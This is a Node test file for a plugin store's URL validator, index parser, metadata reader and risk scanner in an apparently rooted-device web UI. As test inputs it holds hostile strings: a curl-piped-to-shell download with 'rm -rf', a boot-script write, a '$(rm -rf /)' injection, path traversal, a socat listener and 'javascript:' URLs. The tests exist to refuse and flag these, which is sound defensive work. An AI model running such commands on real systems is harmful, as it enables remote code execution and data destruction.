// Tests the plugin store functions in index.html (between UFISTORE-BEGIN / UFISTORE-END). Node only; the fetch and the dialog are not covered here.
const fs = require('fs'), path = require('path'), crypto = require('crypto');
const html = fs.readFileSync(path.join(__dirname, '..', 'app/src/main/assets/web/index.html'), 'utf8');
const a = html.indexOf('/* UFISTORE-BEGIN */'), b = html.indexOf('/* UFISTORE-END */');
if (a < 0 || b < 0) { console.error('UFISTORE markers missing in index.html'); process.exit(1); }
const api = new Function(html.slice(a, b) + '\nreturn {sha256Pure,storeSha256,storeSha256Bytes,storeUrlOk,storeParseIndex,storeFilter,storeEnglish,plugScan,storeSummary,STORE_UFI_SOURCE,plugMeta,plugCompat,MATCHI_ROUTES,MATCHI_ROUTE_PREFIXES};')();
let bad = 0;
const eq = (want, got, n) => { if (JSON.stringify(want) !== JSON.stringify(got)) { bad++; console.error('FAIL', n, JSON.stringify(want), '!=', JSON.stringify(got)); } };
const ok = (c, n) => { if (!c) { bad++; console.error('FAIL', n); } };
const ref = (u8) => crypto.createHash('sha256').update(u8).digest('hex');

// SHA-256: the pure fallback must match Node's for the awkward lengths (padding edges) and a long input.
for (const n of [0, 1, 55, 56, 63, 64, 65, 119, 120, 1000, 100000]) {
  const u8 = Uint8Array.from({ length: n }, (_, i) => (i * 31 + 7) & 255);
  eq(ref(u8), api.sha256Pure(u8), 'sha256Pure length ' + n);
}
eq(ref(Buffer.from('abc')), api.sha256Pure(new TextEncoder().encode('abc')), 'sha256 abc');
(async () => {
  eq(ref(Buffer.from('héllo 中文')), await api.storeSha256('héllo 中文'), 'storeSha256 utf-8');

  // URL rules
  const U = api.storeUrlOk;
  eq('https://example.com/a.js', U('https://example.com/a.js'), 'https ok');
  eq('https://example.com/dir/b.js', U('b.js', 'https://example.com/dir/index.json'), 'relative resolves');
  for (const bad of ['http://example.com/a.js', 'ftp://example.com/a', 'javascript:alert(1)', 'https://user:pw@example.com/a', 'https://192.168.0.1/a', 'https://127.0.0.1/a', 'https://localhost/a', 'https://[::1]/a', 'https://router.local/a', 'https://printer/a', 'https://x.internal/a', '//evil.com/a', '', 'https://' + 'a'.repeat(2100) + '.com/'])
    eq(null, U(bad), 'refused ' + bad.slice(0, 40));
  eq(null, U('/x.js', 'http://example.com/'), 'relative on an http base is refused');

  // Index parsing
  const sha = 'a'.repeat(64);
  let r = api.storeParseIndex(JSON.stringify({ plugins: [
    { name: 'Good', url: 'https://example.com/good.js', sha256: sha.toUpperCase(), description: 'd', author: 'me', version: '1.0', size: 12 },
    { name: 'Rel', url: 'rel.txt' }, { name: 'NoUrl' }, { url: 'https://example.com/x.js' },
    { name: 'BadSha', url: 'https://example.com/y.js', sha256: 'xyz' }, { name: 'Lan', url: 'https://192.168.0.1/z.js' }, 'str', null ] }), 'https://store.example.org/repo/index.json');
  eq('', r.error, 'no error'); eq(['Good', 'Rel'], r.items.map(i => i.name), 'valid entries kept');
  eq(6, r.skipped, 'six skipped'); eq(sha, r.items[0].sha256, 'sha lower-cased');
  eq('https://store.example.org/repo/rel.txt', r.items[1].url, 'relative url resolved against the index');
  eq(1, api.storeParseIndex('[{"name":"A","url":"https://example.com/a.js"}]').items.length, 'bare array');
  ok(api.storeParseIndex('nope').error.includes('JSON'), 'invalid json'); ok(api.storeParseIndex('{"x":1}').error.includes('array'), 'wrong shape');
  ok(api.storeParseIndex(' '.repeat(1048577)).error.includes('1 MB'), 'oversized index');
  eq('A B', api.storeParseIndex('[{"name":"A\\u0000\\nB","url":"https://example.com/a.js"}]').items[0].name.replace(/\s+/g, ' '), 'control characters removed');
  const many = JSON.stringify(Array.from({ length: 600 }, (_, i) => ({ name: 'p' + i, url: 'https://example.com/' + i + '.js' })));
  r = api.storeParseIndex(many); eq(500, r.items.length, 'item cap'); eq(100, r.skipped, 'over-cap counted');


  // Raw bytes: a BOM or invalid UTF-8 must not change the hash the index is checked against.
  const bom = Uint8Array.from([0xEF, 0xBB, 0xBF, 0x61, 0x0D, 0x0A, 0xFF]);
  eq(ref(bom), await api.storeSha256Bytes(bom), 'sha256 over raw bytes');

  // UFI-TOOLS index (shape of the community mirror's store.json): {download_url, res:{data:{content:[...]}}}
  const h64 = 'f36c8d307c46ed77272b9f1a210266b26722f8d618f268165885c8ba122d8641';
  const ufi = { download_url: 'https://raw.githubusercontent.com/o/r/2b31582/ufi-tools-plugins/', res: { code: 200, message: 'success', data: { total: 9, content: [
    { name: '(可多卡)字母卡简洁进度条版.txt', size: 3907, is_dir: false, modified: '2025-08-09T15:30:58+08:00', hash_info: { md5: 'x', sha256: h64.toUpperCase() }, type: 0 },
    { name: 'tool one.js', size: 10, is_dir: false, hash_info: { md5: 'x' }, type: 0 },
    { name: 'kano_ssh.zip', size: 5, is_dir: false, hash_info: { sha256: h64 } },
    { name: 'ddns-go', size: 0, is_dir: true },
    { name: 'big.tar.gz', size: 5, is_dir: false },
    { name: '../evil.js', size: 1, is_dir: false },
    { name: 'badhash.txt', size: 1, is_dir: false, hash_info: { sha256: 'nothex' } },
    { name: 'sub/dir.html', size: 1, is_dir: false },
    'junk' ] } } };
  r = api.storeParseIndex(JSON.stringify(ufi));
  eq('', r.error, 'ufi index parses');
  eq(['(可多卡)字母卡简洁进度条版', 'tool one', 'sub/dir'], r.items.map(i => i.name), 'ufi: only .js/.txt/.html listed, extension stripped');
  eq('https://raw.githubusercontent.com/o/r/2b31582/ufi-tools-plugins/(%E5%8F%AF%E5%A4%9A%E5%8D%A1)%E5%AD%97%E6%AF%8D%E5%8D%A1%E7%AE%80%E6%B4%81%E8%BF%9B%E5%BA%A6%E6%9D%A1%E7%89%88.txt', r.items[0].url, 'ufi: url = download_url + encoded name');
  eq(h64, r.items[0].sha256, 'ufi: sha256 lower-cased'); eq('', r.items[1].sha256, 'ufi: no sha256 is allowed (shown as unverified)');
  eq('https://raw.githubusercontent.com/o/r/2b31582/ufi-tools-plugins/tool%20one.js', r.items[1].url, 'ufi: space encoded');
  eq('https://raw.githubusercontent.com/o/r/2b31582/ufi-tools-plugins/sub/dir.html', r.items[2].url, 'ufi: path separators kept');
  eq(3, r.unsupported, 'ufi: zip, folder and tar.gz counted as unsupported'); eq(3, r.skipped, 'ufi: traversal, bad hash and junk skipped');
  eq(3907, r.items[0].size, 'ufi: size kept');
  ok(api.storeParseIndex(JSON.stringify({ res: { data: { content: [{ name: 'a.js' }] } } })).error.includes('download_url'), 'ufi: missing download_url is an error');
  ok(api.storeParseIndex(JSON.stringify({ download_url: 'http://example.com/x', content: [{ name: 'a.js' }] })).error.includes('download_url'), 'ufi: http download_url refused');
  ok(api.storeParseIndex(JSON.stringify({ download_url: 'https://192.168.0.1/x', content: [{ name: 'a.js' }] })).error.includes('download_url'), 'ufi: LAN download_url refused');
  eq(1, api.storeParseIndex(JSON.stringify({ download_url: 'https://example.com/p', data: { content: [{ name: 'a.js' }] } })).items.length, 'ufi: {data:{content}} variant');
  eq(1, api.storeParseIndex(JSON.stringify({ download_url: 'https://example.com/p', content: [{ name: 'a.js' }] })).items.length, 'ufi: {content} variant');
  eq('https://raw.githubusercontent.com/BearHero520/UFI-TOOLS-PLUGINS/main/store.json', api.STORE_UFI_SOURCE, 'preset points at the community mirror');
  ok(api.storeUrlOk(api.STORE_UFI_SOURCE) === api.STORE_UFI_SOURCE, 'preset passes the https/domain rules');


  // Route list in the page vs the routes WebServer.kt really serves (both directions, so neither side can drift).
  const ktDir = path.join(__dirname, '..', 'app/src/main/java/com/matchi/tool');
  const kt = ['WebServer.kt', ...fs.readdirSync(ktDir).filter(f => /^WebRoutes.*\.kt$/.test(f)).sort()].map(f => fs.readFileSync(path.join(ktDir, f), 'utf8')).join('\n');   // the host is split into WebServer.kt + WebRoutes*.kt
  const ktExact = new Set([...kt.matchAll(/uri == "(\/api\/[A-Za-z0-9_\/]+)"/g)].map(m => m[1]));
  const ktPref = new Set([...kt.matchAll(/uri\.startsWith\("(\/api\/[A-Za-z0-9_\/]+)"/g)].map(m => m[1]));
  eq([...ktExact].sort(), [...api.MATCHI_ROUTES].sort(), 'page route list matches the host routes (exact)');
  eq([...ktPref].sort(), [...api.MATCHI_ROUTE_PREFIXES].sort(), 'page route list matches the host routes (prefix)');

  // Plugin metadata header
  let m = api.plugMeta('// @matchi-name Signal meter\n// @matchi-version 1.2\n/* @matchi-author me */\n * @matchi-description Shows\u0000 signal\n// @matchi-requires root, curl; jq\nconsole.log(1)');
  eq(['Signal meter', '1.2', 'me', 'Shows  signal'.replace(/\s+/g, ' '), ['root', 'curl', 'jq']], [m.name, m.version, m.author, m.description.replace(/\s+/g, ' '), m.requires], 'meta header parsed');
  m = api.plugMeta('x\n'.repeat(50) + '// @matchi-name Late'); eq('', m.name, 'meta only read from the first 40 lines');
  m = api.plugMeta('// @matchi-name A\n// @matchi-name B'); eq('A', m.name, 'first value wins');
  m = api.plugMeta('// @matchi-requires $(rm -rf /), ok'); eq(['ok'], m.requires, 'requires keeps only safe words');
  eq(['', '', '', '', []], [api.plugMeta('plain').name, api.plugMeta('').version, '', '', api.plugMeta('plain').requires], 'no header, no meta');

  // Compatibility report
  let c = api.plugCompat("fetch('/api/goform/goform_get_cmd_process'); fetch('/api/root_shell'); fetch('/api/uploads/x.bin'); fetch('/api/logs/session/abc')");
  ok(c.ok && c.issues.length === 0, 'compat: known routes, including prefix routes, are fine');
  c = api.plugCompat("fetch('/api/get_custom_head'); fetch('/api/set_custom_head'); fetch('/api/nothing_here')");
  ok(!c.ok && /get_custom_head/.test(c.issues[0]) && /nothing_here/.test(c.issues[0]), 'compat: unknown routes listed');
  c = api.plugCompat('const v = getCookie("a"); setCookie("b", 1)'); ok(c.issues.some(i => /getCookie, setCookie/.test(i)), 'compat: undefined cookie helpers flagged');
  c = api.plugCompat('function getCookie(n){return 1}; getCookie("a")'); ok(c.ok, 'compat: a helper the plugin defines itself is fine');
  c = api.plugCompat('runShellWithRoot("socat TCP-LISTEN:1 - ; ttyd -p 2; curl x; jq y")'); ok(c.issues.length === 1 && /socat, ttyd/.test(c.issues[0]) && !/curl|jq/.test(c.issues[0]), 'compat: only tools that are not shipped');
  c = api.plugCompat('runShellWithRoot("ls /data/adb/service.d")'); ok(c.ok, 'compat: /data/adb paths are not an adb tool');
  c = api.plugCompat("sh('/data/data/com.minikano.f50_sms/files/curl'); sh('/data/data/com.minikano.f50_sms/files/frpc'); sh('/data/data/com.minikano.f50_sms/files/x.json')");
  ok(c.issues.length === 1 && /frpc/.test(c.issues[0]) && !/curl|x\.json/.test(c.issues[0]), 'compat: only UFI files that are not shipped');
  const sm2 = api.storeSummary({ name: 'N', sha256: '' }, 'f'.repeat(64), api.plugScan('x'), [], api.plugCompat("fetch('/api/get_custom_head')"));
  ok(sm2.includes('Compatibility: this plugin calls routes'), 'summary shows compat issues');
  ok(api.storeSummary({ name: 'N', sha256: '' }, 'f'.repeat(64), api.plugScan('x'), [], api.plugCompat('x')).includes('no known problems'), 'summary shows a clean compat check');

  // Search and paging
  const items = Array.from({ length: 20 }, (_, i) => ({ name: 'Plugin' + i, description: i % 2 ? 'signal meter' : 'tool', author: 'x' }));
  let f = api.storeFilter(items, '', 1, 8); eq([8, 1, 3, 20], [f.rows.length, f.page, f.pages, f.total], 'page 1 of 3');
  f = api.storeFilter(items, '', 3, 8); eq(4, f.rows.length, 'last page'); f = api.storeFilter(items, '', 99, 8); eq(3, f.page, 'page clamped high');
  f = api.storeFilter(items, '', -5, 8); eq(1, f.page, 'page clamped low');
  f = api.storeFilter(items, 'SIGNAL', 1, 8); eq(10, f.total, 'search is case-insensitive and covers the description');
  f = api.storeFilter(items, 'zzz', 1, 8); eq([0, 1, 1], [f.rows.length, f.page, f.pages], 'no match');

  // Scan
  let s = api.plugScan("await runShellWithRoot('curl -s https://example.org/x | sh; rm -rf /data/x; echo a >> /sdcard/ufi_tools_boot.sh'); fetch('/api/goform/goform_get_cmd_process')");
  ok(s.root && !s.user, 'root detected'); eq(['curl'], s.tools, 'curl found');
  ok(s.risky.includes('deletes files (rm -r)') && s.risky.includes('pipes a download into a shell') && s.risky.includes('writes the boot script'), 'risky patterns');
  eq(['/api/goform/goform_get_cmd_process'], s.endpoints, 'endpoint'); eq(['example.org'], s.hosts, 'host');
  s = api.plugScan("runShellWithUser('jq . /data/data/com.minikano.f50_sms/files/x.json; sha256 abc; zreq')");
  ok(s.user && !s.root, 'user detected'); eq(['jq', 'sha256', 'zreq'], s.tools, 'tools found');
  s = api.plugScan('createToast("hi")'); ok(!s.root && !s.user && !s.tools.length && !s.risky.length, 'quiet plugin');
  ok(api.plugScan('x = jqx + curlish').tools.length === 0, 'tool names match whole words only');
  const sm = api.storeSummary({ name: 'N', version: '2', author: 'me', sha256: '' }, 'f'.repeat(64), api.plugScan('runShellWithRoot("x")'), ['N.js']);
  ok(sm.includes('NO SHA-256') && sm.includes('ROOT') && sm.includes('REPLACE: N.js') && sm.includes('f'.repeat(64)), 'summary text');
  // storeEnglish: display-only English for Chinese plugin names (the real names from the community mirror).
  eq('(Multi-SIM) Letter card simple progress bar edition', api.storeEnglish('(可多卡)字母卡简洁进度条版'), 'english: letter card');
  eq('(Multi-SIM) Xiaojing card simple progress bar edition', api.storeEnglish('(可多卡)小鲸卡简洁进度条版'), 'english: xiaojing card');
  eq('(Multi-SIM) New Xiaojing backend card simple progress bar edition', api.storeEnglish('(可多卡)新小鲸后台卡片简洁进度条版'), 'english: new backend card');
  eq('3M one-click unlock', api.storeEnglish('3M一键解控'), 'english: keeps Latin and digits');
  eq('ADGuardHome plugin 1.2', api.storeEnglish('ADGuardHome插件1.2'), 'english: spacing around Latin and numbers');
  eq('(Local proxy edition) 字母哥 data card', api.storeEnglish('（本地代理版）字母哥流量卡片'), 'english: full-width brackets, unknown words stay');
  eq('Plain English plugin', api.storeEnglish('Plain English plugin'), 'english: English passes through unchanged');
  eq('', api.storeEnglish(null), 'english: null is safe'); eq('', api.storeEnglish(undefined), 'english: undefined is safe');
  const zhItems = [{ name: '3M一键解控', description: '', author: '' }, { name: 'other', description: '', author: '' }];
  eq(1, api.storeFilter(zhItems, 'unlock', 1).total, 'search finds the English text'); eq(1, api.storeFilter(zhItems, '一键', 1).total, 'search still finds the original');
  eq('3M一键解控', zhItems[0].name, 'english: item names are never changed');
  if (bad) { console.error(bad + ' store test(s) failed'); process.exit(1); }
  console.log('ufi store tests passed');
})();
